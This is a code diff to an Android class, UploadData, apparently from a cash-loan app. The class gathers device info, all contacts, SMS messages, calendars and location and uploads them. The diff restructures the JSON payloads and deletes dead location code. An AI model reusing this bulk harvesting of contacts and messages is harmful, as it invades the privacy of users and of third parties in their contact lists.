@@ -82,8 +82,12 @@ public class UploadData {
   public void getAndSendDevice() {
     Log.d(TAG, "getAndSendDevice Start!!!");
     JSONObject deviceInfo = DeviceUtils.getSystemInfoReport(mContext);
+
+    JSONObject dataJson = new JSONObject();
+    dataJson.put("device", deviceInfo);
+
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", deviceInfo);
+    jsonObject.put("data", dataJson);
     Log.d(TAG, "deviceInfo:" + deviceInfo);
     postOssSign(jsonObject, 1);
   }
@@ -95,8 +99,12 @@ public class UploadData {
   public void getAndSendContact() {
     Log.d(TAG, "getAndSendContact Start!!!");
     List<JSONObject> contact = mSystemInfo.getAllContacts();
+
+    JSONObject dataJson = new JSONObject();
+    dataJson.put("contact", contact);
+
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", contact);
+    jsonObject.put("data", dataJson);
     Log.d(TAG, "contact:" + contact);
     postOssSign(jsonObject, 2);
   }
@@ -121,7 +129,7 @@ public class UploadData {
    */
   @RequiresApi(api = VERSION_CODES.M)
   public void getAndSendSms(long timeStamp) {
-    Log.d(TAG, "getAndSendSms Start!!!");
+    Log.d(TAG, "getAndSendSms Start!!! timeStamp:" + timeStamp);
     JSONObject jsonObject = new JSONObject();
 
     Uri mUri = Uri.parse(UploadData.SMS_URI_ALL);
@@ -164,8 +172,11 @@ public class UploadData {
 
         //每1000条数据上传一次
         if(mInfoList != null && mInfoList.size() > 0 && mInfoList.size() >= mMaxCount) {
+          JSONObject dataJson = new JSONObject();
+          dataJson.put("sms", mInfoList);
+
           jsonObject.remove("data");
-          jsonObject.put("data", mInfoList);
+          jsonObject.put("data", dataJson);
           mInfoList = new ArrayList<>();
           postOssSign(jsonObject, 3);
         }
@@ -174,8 +185,11 @@ public class UploadData {
       cusor.close();
 
       if(mInfoList != null && mInfoList.size() > 0) {
+        JSONObject dataJson = new JSONObject();
+        dataJson.put("sms", mInfoList);
+
         jsonObject.remove("data");
-        jsonObject.put("data", mInfoList);
+        jsonObject.put("data", dataJson);
         mInfoList = new ArrayList<>();
         postOssSign(jsonObject, 3);
       }
@@ -191,8 +205,11 @@ public class UploadData {
     List<JSONObject> calendars = mSystemInfo.getCalendars();
     Log.d(TAG, "calendars post data:" + calendars.toString());
 
+    JSONObject dataJson = new JSONObject();
+    dataJson.put("calendar", calendars);
+
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", calendars);
+    jsonObject.put("data", dataJson);
     Log.d(TAG, "calendars:" + calendars);
     postOssSign(jsonObject, 4);
   }
@@ -211,121 +228,13 @@ public class UploadData {
     locationJson.put("latitude", location[0]);
     locationJson.put("longitude", location[1]);
 
+    JSONObject dataJson = new JSONObject();
+    dataJson.put("location", locationJson);
+
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", locationJson);
+    jsonObject.put("data", dataJson);
     postOssSign(jsonObject, 5);
   }
-
-  //  @RequiresApi(api = VERSION_CODES.M)
-//  private void sendLocation(Location location) {
-//    JSONObject locationObj = new JSONObject();
-//    if(location != null) {
-//      locationObj.put("longitude", location.getLongitude());
-//      locationObj.put("latitude", location.getLatitude());
-//    }
-//
-//    JSONObject jsonObject = new JSONObject();
-//    jsonObject.put("data", locationObj);
-//    postOssSign(jsonObject, 5);
-//  }
-
-//  /**
-//   * 获取位置信息
-//   */
-//  @RequiresApi(api = VERSION_CODES.M)
-//  public void getAndSendLocation2() {
-//    Log.d(TAG, "getAndSendLocation Start!!!");
-//    getLocation();
-//    double[] locationJson =
-//        com.cashhub.cash.common.utils.LocationUtils.getLatAndLng(mContext.getApplicationContext());
-//    Log.d(TAG, "getAndSendLocation2 locationJson: " + locationJson[0] + "," + locationJson[1]);
-//  }
-
-
-//  @RequiresApi(api = VERSION_CODES.M)
-//  private void getLocation() {
-//    //1.获取位置管理器
-//    locationManager = (LocationManager) mContext.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
-//    //2.获取位置提供器，GPS或是NetWork
-//    List<String> providers = locationManager.getProviders(true);
-//    Log.e(TAG, providers.toString());
-//    if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
-//      //如果是网络定位
-//      locationProvider = LocationManager.NETWORK_PROVIDER;
-//      Log.e(TAG, "locationManager 网络");
-//    } else if (providers.contains(LocationManager.GPS_PROVIDER)) {
-//      //如果是GPS定位
-//      locationProvider = LocationManager.GPS_PROVIDER;
-//      Log.e(TAG, "locationManager gps");
-//    } else {
-//      Log.e(TAG, "没有可用的位置提供器");
-////      Toast.makeText(this, "没有可用的位置提供器", Toast.LENGTH_SHORT).show();
-//      return;
-//    }
-//
-//    //3.获取上次的位置，一般第一次运行，此值为null
-//    if (mContext.getApplicationContext().checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-//        mContext.getApplicationContext().checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-//      // TODO: Consider calling
-//      //    ActivityCompat#requestPermissions
-//      // here to request the missing permissions, and then overriding
-//      //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-//      //                                          int[] grantResults)
-//      // to handle the case where the user grants the permission. See the documentation
-//      // for ActivityCompat#requestPermissions for more details.
-//
-//      Log.e(TAG, "没权限");
-//      return;
-//    }
-//    Location location = locationManager.getLastKnownLocation(locationProvider);
-//    if (location != null) {
-//      Log.e(TAG, "location != null");
-//      sendLocation(location);
-//    } else {
-//      Log.e(TAG, "location == null");
-//      // 监视地理位置变化，第二个和第三个参数分别为更新的最短时间minTime和最短距离minDistace
-//      locationManager.requestLocationUpdates(locationProvider, 0, 0, mListener);
-//    }
-//  }
-//
-//  @RequiresApi(api = VERSION_CODES.M)
-//  private void sendLocation(Location location) {
-//    JSONObject locationObj = new JSONObject();
-//    if(location != null) {
-//      locationObj.put("longitude", location.getLongitude());
-//      locationObj.put("latitude", location.getLatitude());
-//    }
-//
-//    JSONObject jsonObject = new JSONObject();
-//    jsonObject.put("data", locationObj);
-//    postOssSign(jsonObject, 5);
-//  }
-
-//  LocationListener mListener = new LocationListener() {
-//    @Override
-//    public void onStatusChanged(String provider, int status, Bundle extras) {
-//      Log.e(TAG, "onStatusChanged");
-//    }
-//
-//    @Override
-//    public void onProviderEnabled(String provider) {
-//      Log.e(TAG, "onProviderEnabled");
-//    }
-//
-//    @Override
-//    public void onProviderDisabled(String provider) {
-//
-//      Log.e(TAG, "onProviderDisabled");
-//    }
-//
-//    // 如果位置发生变化，重新显示
-//    @RequiresApi(api = VERSION_CODES.M)
-//    @Override
-//    public void onLocationChanged(Location location) {
-//      Log.e(TAG, "onLocationChanged");
-//      sendLocation(location);
-//    }
-//  };
 
   @RequiresApi(api = VERSION_CODES.M)
   private void postOssSign(JSONObject jsonObject, int dataType) {
@@ -413,9 +322,12 @@ public class UploadData {
   @RequiresApi(api = VERSION_CODES.M)
   private void putDataSignUrl(JSONObject jsonObject, String bodyStr, String domain,
       String deviceKey, int dataType) {
-    if(TextUtils.isEmpty(bodyStr)) {
+    if(TextUtils.isEmpty(bodyStr) || jsonObject == null) {
       return;
     }
+
+    Log.d(TAG, "putDataSignUrl dataType:" + dataType);
+    Log.d(TAG, "putDataSignUrl jsonObject:" + jsonObject.get("data"));
 
     Gson gson = new Gson();
     SignResponseInfo signResponseInfo = gson.fromJson(bodyStr, new TypeToken<SignResponseInfo>(){}.getType());
